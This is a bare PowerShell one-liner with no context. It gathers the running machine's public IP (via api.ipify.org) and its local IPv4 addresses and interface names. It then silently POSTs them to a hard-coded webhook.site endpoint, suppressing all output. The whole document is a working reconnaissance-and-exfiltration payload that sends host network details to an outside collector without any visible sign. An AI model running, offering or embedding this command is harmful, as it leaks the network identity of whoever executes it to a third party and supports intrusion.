$p=(Invoke-RestMethod "https://api.ipify.org"); $l=Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)'-and $_.InterfaceAlias -notmatch 'Virtual|vEthernet|Loopback' } | Select-Object InterfaceAlias, IPAddress | Out-String; Invoke-RestMethod -Uri "https://webhook.site/04e7cda9-ef6f-4506-8b8f-25a0f5190c00" -Method Post -Body "Public IP: $p`n`nLocal IPs:`n$l" | Out-Null